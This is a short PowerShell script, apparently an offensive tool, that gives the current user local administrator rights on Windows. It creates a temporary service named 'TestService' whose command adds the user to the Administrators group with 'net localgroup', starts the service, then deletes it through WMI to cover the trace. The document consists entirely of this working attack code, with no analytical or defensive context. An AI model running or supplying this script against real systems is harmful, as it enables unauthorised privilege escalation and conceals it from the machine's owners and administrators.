<#
    BSD 2-Clause License

    Copyright (c) 2017, 
    All rights reserved.

    Redistribution and use in source and binary forms, with or without
    modification, are permitted provided that the following conditions are met:

    * Redistributions of source code must retain the above copyright notice, this
      list of conditions and the following disclaimer.

    * Redistributions in binary form must reproduce the above copyright notice,
      this list of conditions and the following disclaimer in the documentation
      and/or other materials provided with the distribution.

    THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
    AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
    IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
    DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
    FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
    DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
    SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
    CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
    OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
    OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
    
    -SmUrF3R5 @SmUrF3R5
#>

$TempServiceName = "TestService"

Write-Host -ForegroundColor Green [+] -NoNewline

Write-Host -ForegroundColor Yellow " Checking Local Admin Membership Status"

$username = "$env:USERDOMAIN\$env:USERNAME"

if (net localgroup Administrators | select-string -SimpleMatch $username)
{  
    Write-Host -ForegroundColor Green "`tLocalAdmin:" -NoNewline
    write-host -ForegroundColor white "`t$username => $true"
}
else
{
    Write-Host -ForegroundColor Green "`tLocalAdmin:" -NoNewline
    write-host -ForegroundColor white "`tAdding => $username`n"    

    Write-Host -ForegroundColor Green [+] -NoNewline
    Write-Host -ForegroundColor Yellow " Adding Service"

    $createService = New-Service -Name $TempServiceName -BinaryPathName "C:\windows\system32\CMD.exe /K net localgroup Administrators $username /add"-StartupType Manual
    
    if (get-service $TempServiceName)
    {
        Write-Host -ForegroundColor Green "`tServiceStatus:" -NoNewline
        write-host -ForegroundColor white "`tTestService => $true`n" 

        Start-Sleep -Milliseconds 500

        Write-Host -ForegroundColor Green [+] -NoNewline
        Write-Host -ForegroundColor Yellow " Starting Service Adding Local Admin $username"

        $Service = Start-Service TestService -ErrorAction SilentlyContinue

        Write-Host -ForegroundColor Green [+] -NoNewline
        Write-Host -ForegroundColor Yellow " Deleting Service"

        Try
        {
            Write-Host -ForegroundColor Green "[+] " -NoNewline
            Write-Host -ForegroundColor Yellow "Service Status" -NoNewline

            $DeleteService = (Get-WmiObject win32_service -Filter "name='$TempServiceName'").delete()

            write-host -ForegroundColor Green " => " -NoNewline
            write-host -ForegroundColor White "Service Deleted`n"
         }
         catch
         {
            write-host -ForegroundColor red " => " -NoNewline
            write-host -ForegroundColor White "Unable to Delete Service`n"
         }

         Write-Host -ForegroundColor Green [+] -NoNewline
         Write-Host -ForegroundColor Yellow " Checking Admin Status [$TempServiceName]"

         if (net localgroup Administrators | select-string -SimpleMatch $username)
         {  
            Write-Host -ForegroundColor Green "`tLocalAdmin:" -NoNewline
            write-host -ForegroundColor white " $username => $true"
         }
         Else
         {
            Write-Host -ForegroundColor Red "`tLocalAdmin:" -NoNewline
            write-host -ForegroundColor Red " $username => $False"
         }
    }
  } 
